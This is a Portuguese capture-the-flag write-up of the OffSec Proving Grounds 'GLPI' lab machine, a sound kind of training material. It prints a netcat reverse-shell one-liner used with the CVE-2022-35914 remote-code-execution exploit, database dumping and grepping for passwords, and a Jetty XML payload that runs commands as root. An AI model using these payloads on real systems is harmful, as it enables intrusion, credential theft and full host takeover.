---
title:     "OffSec Proving Grounds - GLPI"
tags: [linux,easy,CVE-2022-35914,jetty]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/d3fd4974-59c0-4d1f-89d1-31268ff1fb87)

## Enumeration

### 1. **Enumeração Inicial com NmapAutomator e Nmap**

A primeira fase de exploração da máquina **GLPI** começou com a realização de uma varredura para identificar portas abertas e os serviços em execução no sistema.

#### **Passo 1**: Utilizando o **NmapAutomator** para agilizar a enumeração:

```bash
└─$ nmapAutomator.sh -H 192.168.199.24 -t All -o nmapautomator-all-ports
```

O **NmapAutomator** é uma ferramenta que automatiza diferentes varreduras do **Nmap**, proporcionando uma enumeração mais eficiente e organizada. Aqui, usamos a opção **-t All** para realizar uma varredura completa em todas as portas, garantindo que nenhum serviço relevante seja omitido.

#### **Passo 2**: Executando uma varredura manual com **Nmap**:

```
└─$ nmap -T4 -p- -v 192.168.199.24 -oN nmap-all-ports
```

![image](https://github.com/user-attachments/assets/d5b6c065-e80b-4d0e-8cb2-98dc26d1b482)

![image](https://github.com/user-attachments/assets/ca540d76-65c0-49f2-a1a7-575681ddfb6c)

Essa varredura manual com o **Nmap** utiliza o parâmetro **-p-** para escanear todas as 65.535 portas, garantindo a cobertura total. A opção **-T4** ajusta o tempo para uma varredura mais rápida, e **-v** ativa o modo verbose, fornecendo feedback detalhado durante o processo. Os resultados são salvos no arquivo **nmap-all-ports** para consulta posterior.

Como vimos anteriormente, foram encontradas duas portas abertas: 80 e 22. A porta 80 está associada a uma aplicação web chamada GLPI, enquanto a porta 22 é utilizada pelo serviço SSH, como já é de conhecimento.

![image](https://github.com/user-attachments/assets/a1236c03-51bc-4c18-8838-e2350a9f0e0f)

Inicialmente, tentei acessar a aplicação utilizando senhas padrão, que podem ser facilmente encontradas com uma rápida pesquisa no Google ou até mesmo com o auxílio de ferramentas como o ChatGPT.

![image](https://github.com/user-attachments/assets/3d5b4c9a-5d11-4035-a553-1fdd777591cc)

As seguintes combinações de usuários e senhas foram testadas:

    glpi/glpi (super-admin)
    tech/tech
    postonly/postonly (apenas para helpdesk)
    normal/normal

No entanto, não obtive sucesso com nenhuma dessas credenciais.

Em seguida, voltei ao Google e pesquisei por possíveis ferramentas de scan de vulnerabilidades específicas para o GLPI. Encontrei uma ferramenta interessante, com a qual consegui obter informações valiosas, como a versão do GLPI, arquivos acessíveis, e identificar uma vulnerabilidade que poderia ser explorada.

![image](https://github.com/user-attachments/assets/fa7a12b0-9234-4399-bb27-39cc9e4d3c1c)

https://github.com/Digitemis/GLPIScan
![image](https://github.com/user-attachments/assets/697a266d-7ddf-44be-876b-38589d3e1e05)

É uma ferramenta simples de usar. Você pode executá-la com o seguinte comando:

```
python3 GLPIScan.py -u http://192.168.232.242/ -a
```

- **-u**: especifica a URL alvo.
- **-a**: executa todas as checagens disponíveis.

Para mais informações sobre o uso da ferramenta, consulte a opção de ajuda utilizando o parâmetro **--help**.

![image](https://github.com/user-attachments/assets/ea5e6be4-94d3-469f-a529-b27a3dfc55ae)

![image](https://github.com/user-attachments/assets/8c2b23d6-29b3-42d0-a952-3a3a2c9d6bf1)

Como podemos observar, encontramos a versão do GLPI, que é 10.0.2, e identificamos uma vulnerabilidade associada, o CVE-2022-35914, à qual a aplicação está vulnerável.

Novamente, realizando uma pesquisa no Google por exploits disponíveis para o CVE-2022-35914, encontrei alguns recursos que podem nos ajudar. Como podemos ver nas imagens abaixo:

![image](https://github.com/user-attachments/assets/6f57f440-7a9d-4601-864f-024fa8686af7)

![image](https://github.com/user-attachments/assets/f3434d49-ff3b-44e9-baf4-def899004ccf)

Após ler o artigo, tentei obter RCE (Remote Code Execution), mas sem sucesso. Também tentei utilizar o exploit que encontrei no GitHub, que não gerou resultados significativos, mas me deu uma pista de como prosseguir. Além disso, havia uma observação interessante no artigo que mencionei:

"Please note that there are other ways to exploit the vulnerability without exec, by using callback functions like array_map, call_user_func,… do not rely on disable_function on exec to patch the vulnerability."

Ou seja, se a função exec estiver desabilitada, você pode tentar outras alternativas. Comprovei isso ao executar o exploit mencionado, que simplesmente retornou (array).

![image](https://github.com/user-attachments/assets/9ae1f2d9-eb44-42e1-9861-1f9613bf5113)

![image](https://github.com/user-attachments/assets/05cecf4c-6507-4cf3-8ed2-c2e0babd827b)

Fui ao Google novamente, desta vez pesquisando da seguinte forma:

glpi CVE-2022-35914 array_map github.

Com isso, encontrei novos exploits que utilizavam a função array_map.

![image](https://github.com/user-attachments/assets/0aefc2db-9500-4b36-9881-04d4f90c4a64)

https://github.com/senderend/CVE-2022-35914
![image](https://github.com/user-attachments/assets/f15e0d80-2218-4ed2-b3da-efe6b9f2c63f)

https://github.com/noxlumens/CVE-2022-35914_poc
![image](https://github.com/user-attachments/assets/c8a75793-0bea-4312-8b8d-db807919ad6e)

## Exploitation

Após a fase de enumeração e análise das vulnerabilidades encontradas, passei para a exploração do CVE-2022-35914. Utilizando o primeiro exploit encontrado no GitHub, que fazia uso da função array_map, rapidamente consegui obter um RCE (Remote Code Execution). Isso permitiu controle remoto sobre o sistema vulnerável, abrindo caminho para manipulações adicionais e coleta de informações sensíveis.

![image](https://github.com/user-attachments/assets/a48e6447-4e50-4c39-a8fc-1b706a580e2a)

Tentei várias formas de obter uma reverse shell utilizando o próprio exploit, mas não obtive sucesso imediato. Diante disso, precisei usar o Burp Suite para interceptar o payload do exploit e entender melhor o que estava acontecendo.

![image](https://github.com/user-attachments/assets/008f68a1-28cb-4513-b637-f20b0a5cb034)

O problema era que, ao enviar o payload:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.45.219 80 >/tmp/f
```

ele não estava sendo codificado corretamente. Foi necessário enviar a requisição para o **Repeater** no **Burp Suite** e codificar o payload corretamente. Após isso, consegui obter uma **reverse shell**.

Depois, analisei novamente a situação, pois não fazia sentido o problema estar acontecendo. Percebi que, provavelmente, eu estava cometendo algum erro (risos). Lembre-se, nem sempre o problema é o exploit; às vezes, é a porta que você está utilizando. Mesmo que você use portas comumente liberadas no firewall, nem todas podem estar disponíveis. No meu caso, a porta 443 não estava liberada, mas a 80 estava. Então, alterei para a porta 80 e a exploração funcionou, obtendo, assim, minha reverse shell.

![image](https://github.com/user-attachments/assets/9eb142be-8cb5-4413-a4c4-07c629f57731)

## Privilege Escalation

Primeiramente, é necessário realizar uma nova fase de reconhecimento, desta vez com foco em escalada de privilégios. O objetivo agora é identificar possíveis pontos vulneráveis que possam ser explorados para elevar os privilégios no sistema. Vamos começar buscando por arquivos de configuração, na tentativa de encontrar senhas ou informações sensíveis que possam ser utilizadas nesse processo.

Se preferir, você pode automatizar essa atividade utilizando ferramentas como o LinPEAS (https://github.com/peass-ng/PEASS-ng) ou o LinEnum (https://github.com/rebootuser/LinEnum).

Pesquisando por arquivos interessantes dentro do próprio diretório, encontrei um arquivo de configuração que continha a senha do banco de dados.

![image](https://github.com/user-attachments/assets/397dd662-afb1-4b9e-b0d8-5e874ebe3c45)

Com essa senha, tentei reutilizá-la para o usuário Betty, mas sem sucesso. Em seguida, tentei acessar o banco de dados e obtive sucesso.

```
mysql -u glpi -p
```

Inicialmente, tentei quebrar os hashes encontrados, mas sem sucesso.

![image](https://github.com/user-attachments/assets/c441300e-66ff-47b6-acb7-8b3828ad28a3)

Como seria inviável ler todas as tabelas linha por linha, decidi fazer um dump completo do banco de dados e usar o grep para agilizar o processo.

```
mysqldump -u glpi -p glpi > glpi_dump.sql
grep -i 'password' glpi_dump.sql
```

![image](https://github.com/user-attachments/assets/7dc6861f-85ec-4cb7-af4c-6cd879765602)

Após isso, encontrei a senha SnowboardSkateboardRoller234. Tentei novamente fazer login com o usuário Betty e, desta vez, tive sucesso.

Desta vez, utilizei o LinPEAS para me ajudar na escalada de privilégios. Ele trouxe informações valiosas, como a presença de uma aplicação chamada Jetty, localizada em /opt, e uma porta local 8080 em execução.

Então, criei um túnel SSH para acessar essa porta local 8080 no meu localhost (Kali) utilizando o seguinte comando:

```
ssh -L 3000:localhost:8080 betty@192.168.232.242
```

Agora, basta acessar a porta 3000 no Kali, e você verá a aplicação Jetty.
![image](https://github.com/user-attachments/assets/02f91bf7-df28-4dc8-a21f-f03a537f5841)

Voltei ao Google e comecei a pesquisar por explorações para o Jetty. Encontrei um artigo interessante que me levou a conseguir executar comandos como root.

https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/
![image](https://github.com/user-attachments/assets/86b5309b-a3f9-479d-acc6-cdf7a2ef0c7e)


```
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
 <Call class="java.lang.Runtime" name="getRuntime">
  <Call name="exec">
   <Arg>
    <Array type="String">
     <Item>/bin/sh</Item>
     <Item>-c</Item>
     <Item>curl -F "r=`id`" http://127.0.0.1:1337</Item>
    </Array>
   </Arg>
  </Call>
 </Call>
</Configure>
```

Dentro da máquina alvo :

```
nc -nlvp 1337
```

![image](https://github.com/user-attachments/assets/3a3417c6-1f08-486f-adbe-76370d34013f)
